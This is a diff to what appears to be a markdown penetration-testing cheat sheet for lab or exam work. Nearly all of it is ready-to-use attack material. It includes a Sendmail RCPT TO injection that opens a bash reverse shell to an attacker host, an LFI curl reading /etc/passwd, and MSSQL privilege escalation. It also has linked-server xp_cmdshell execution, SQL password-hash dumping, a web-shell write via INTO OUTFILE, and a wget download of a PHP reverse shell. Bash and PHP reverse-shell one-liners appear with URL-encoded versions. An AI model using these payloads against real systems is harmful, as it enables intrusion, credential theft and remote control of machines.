@@ -685,7 +685,17 @@ Use these when you have a shell but no tools (like BloodHound/Netexec) uploaded 
   - *Discovery OID (Running Procs)*: `.1.3.6.1.2.1.25.4.2.1.2` (`hrSWRunName`).
   - *Hostname Discovery*: `smbclient -L [IP] -N` (Look for NetBIOS Computer Name).
   - *Exploit Logic*: Manual `RCPT TO` injection often fails stability checks; use `searchsploit -m 4761` for persistent backdoor creation via `inetd`.
-  - *Automated Trigger*: `perl 4761.pl [IP]` (Creates root shell on port 31337).
+  - *Manual Trigger (POC)*:
+    ```bash
+    nc -nv [IP] 25
+    HELO [INTERNAL_DOMAIN]
+    MAIL FROM: <root@[INTERNAL_DOMAIN]>
+    RCPT TO: <root@localhost.localdomain'|/bin/sh -c "sh -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1"'>
+    DATA
+    Subject: Trigger
+    .
+    ```
+  - *Automated Trigger (Persistent)*: `perl 4761.pl [IP]` (Creates root shell on port 31337).
 
 - **Exhibitor Web UI RCE (CVE-2020-10978):**
   - *Context*: Supervises ZooKeeper. Found on ports 8080 or 8081.
@@ -697,6 +707,10 @@ Use these when you have a shell but no tools (like BloodHound/Netexec) uploaded 
   - *Context*: Version 1.3.3 / `classes_dir` parameter.
   - *Path*: `/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../etc/passwd%00`
   - *Manual Tip*: Requires null byte `%00` for legacy PHP versions.
+
+- **Vesta CP reset/index.php LFI (FRANKFURT/OSCPC):**
+  - *Status*: **[RABBIT HOLE]** - Found in lab .157 but did not yield RCE directly.
+  - *Command*: `curl -k "https://[IP]:8083/api/v1/reset/index.php?action=confirm&user=admin&code=../../etc/passwd"`
 
 - **Joomla Template Shell (RCE via Admin):**
   1. Extensions -> Templates -> Templates.
@@ -895,8 +909,6 @@ Variations to escape/close the query:
 | `'))` (Double Paren) | `;%00` | Null Byte (Bypass PHP filters) |
 
 - **Login & Shell (MySQL/MariaDB):**
-
-- **Login & Shell (MySQL/MariaDB):**
   - **Check File Privs**: `SELECT user, host, file_priv FROM mysql.user;`
   - **Write Web Shell**: `SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/path/to/www/shell.php';`
   - **Read File**: `SELECT LOAD_FILE('C:/windows/win.ini');`
@@ -930,6 +942,17 @@ Use these queries after connecting via `impacket-mssqlclient`.
   SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
   # List all columns in a specific table
   SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='[TABLE_NAME]';
+  ```
+- **Database Impersonation (Escalate to SA):**
+  - *Find*: `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';`
+  - *Execute*: `EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;`
+- **Linked Servers (Find other DBs):**
+  - *List*: `EXEC sp_linkedservers;`
+  - *Execute*: `EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];`
+- **Harvest Credentials (Sysadmin Required):**
+  ```sql
+  # Dump SQL login hashes
+  SELECT name, password_hash FROM master.sys.sql_logins;
   ```
 - **Dump Data:**
   ```sql
@@ -1270,6 +1293,10 @@ Don't get overwhelmed by searching just for "linux kernel". Most effective combi
 4. **Initialize**: Hit `Enter` once
 5. **Reset**: Type `reset` and hit `Enter`
 6. **Terminal Type**: If asked `Terminal type?`, type `xterm` and hit `Enter`
+
+**Quick TTY Cheat Sheet:**
+- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+- `Ctrl+Z`, `stty raw -echo; fg`, `reset`
 
 ### 👤 Linux User & Auth Management (Persistence)
 - **Add Sudo User**:
@@ -1681,6 +1708,14 @@ Comprehensive list of one-liners with their URL-encoded versions for immediate u
 **PHP Proc_Open (High Reliability)**
 - **Command**: `php -r '$sock=fsockopen("10.10.10.10",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`
 - **URL Enc**: `php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.10.10%22%2C4444%29%3B%24proc%3Dproc_open%28%22sh%22%2C%20array%280%3D%3E%24sock%2C%201%3D%3E%24sock%2C%202%3D%3E%24sock%29%2C%24pipes%29%3B%27`
+
+**Ivan Sincek PHP RevShell (High Quality)**
+- **Upload via LFI/Logs**: `wget http://[KALI_IP]/shell.php -O /var/www/html/rev.php`
+- **Trigger**: `http://[IP]/rev.php`
+
+**Generic RevShell One-liner (Trigger via shell.php?cmd=...)**
+- **Command**: `bash -c 'bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1'`
+- **URL Encoded**: `bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[KALI_IP]%2F4444%200%3E%261%27`
 
 ---
 
